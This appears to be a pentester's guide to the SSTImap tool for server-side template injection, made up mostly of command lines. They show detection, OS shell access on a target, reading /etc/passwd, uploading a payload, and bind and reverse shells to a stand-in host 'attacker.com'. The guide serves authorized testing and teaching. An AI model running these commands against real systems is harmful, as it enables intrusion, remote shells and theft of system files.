---
icon: shield-cross
---

# SSTImap

## The SSTImap Masterclass: Professional SSTI Detection & Exploitation

SSTImap is an advanced, interactive tool for detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities across multiple template engines and web frameworks. It supports code evaluation, OS command execution, file operations, and blind injection scenarios, making it essential for professional web application penetration testers.

***

### I. Environment Setup: Dynamic Variables

Export variables for flexible, repeatable workflows and organized output:

```bash
export URL="<https://target.com/page?name=FUZZ>"
export COOKIE="SESSION=abcd1234; other=xyz"
export USER_AGENT="Mozilla/5.0 (SSTImap)"
export PROXY="<http://127.0.0.1:8080>"
export OUTPUT_DIR="sstimap-results"
export PARAM="name"
export THREADS=10
```

***

### II. Core Capabilities & Workflow

* Automatic SSTI detection across common engines such as Jinja2, Twig, Smarty, and more
* Interactive exploitation for OS and template engine code execution
* Blind and contextual injection handling
* Payload library with generic and engine-specific payloads
* File operations (read and write) on the target system
* Shell access options (bind and reverse), OS command execution, and code evaluation
* SSL and header control (proxy, User-Agent, cookies)

***

### III. Professional Usage Examples

#### 1) Automatic SSTI Detection (Predetermined Mode)

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL"
```

#### 2) Specify Parameter for Testing

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" -p "$PARAM"
```

#### 3) Use Proxy (e.g., Burp Suite)

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --proxy "$PROXY"
```

#### 4) Custom User-Agent and Cookies

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --user-agent "$USER_AGENT" --cookie "$COOKIE"
```

#### 5) Interactive OS Shell on Target

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --os-shell
```

#### 6) Execute OS Command

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --os-cmd "whoami"
```

#### 7) Evaluate Code in Template Engine Language

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --eval-cmd "7*7"
```

#### 8) File Read/Write Operations

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --download "/etc/passwd" "./passwd.txt"
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --upload "./[payload.sh](<http://payload.sh>)" "/tmp/[payload.sh](<http://payload.sh>)"
```

#### 9) Bind and Reverse Shells

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --bind-shell 4444
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --reverse-shell [attacker.com](<http://attacker.com>) 4444
```

#### 10) Test All Contexts with Generic Payloads

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --generic
```

***

### IV. Real-World Workflow Example

1. Export variables

```bash
export URL="<https://app.htb/page?name=FUZZ>"
export COOKIE="SESSION=xyz"
export OUTPUT_DIR="sstimap_htb"
```

2. Detect SSTI and identify engine

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --cookie "$COOKIE" --output "$OUTPUT_DIR/detect.txt"
```

3. Exploit with OS shell

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --os-shell --output "$OUTPUT_DIR/os-shell.txt"
```

4. Read sensitive files

```bash
python3 [sstimap.py](<http://sstimap.py>) -u "$URL" --download "/etc/passwd" "$OUTPUT_DIR/passwd.txt"
```

5. Blind injection (if needed)

* Use generic payloads and monitor for out-of-band effects or delayed responses.

6. Document findings

* Save all output and exploitation steps for reporting and future reference.

***

### V. Pro Tips & Best Practices

* Start with automatic detection to quickly identify engine and context
* Use interactive shells for deeper exploitation and post-exploitation
* Test all contexts with `--generic` for comprehensive coverage
* Prefer engine-specific payloads for reliability and impact
* Route traffic through Burp for manual inspection when needed
* Record all steps and outputs for reporting and reproducibility
* Only test targets with explicit authorization
* Combine with manual testing and tools like Tplmap and custom payloads for full SSTI coverage

***

This professional SSTImap guide equips you for advanced, context-driven SSTI detection, exploitation, and reporting in real-world web application security assessments.

1. [https://github.com/vladko312/SSTImap](https://github.com/vladko312/SSTImap)
2. [https://owasp.org/www-project-web-security-testing-guide/v41/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/18-Testing\_for\_Server\_Side\_Template\_Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
3. [https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
4. [https://infosecwriteups.com/mastering-server-side-template-injection-ssti-a-comprehensive-guide-for-pentesters-4fa5e092f56e](https://infosecwriteups.com/mastering-server-side-template-injection-ssti-a-comprehensive-guide-for-pentesters-4fa5e092f56e)
5. [https://cybersectools.com/tools/sstimap](https://cybersectools.com/tools/sstimap)
6. [https://pentestreports.com/command/sstimap](https://pentestreports.com/command/sstimap)
7. [https://sallam.gitbook.io/sec-88/web-appsec/ssti](https://sallam.gitbook.io/sec-88/web-appsec/ssti)
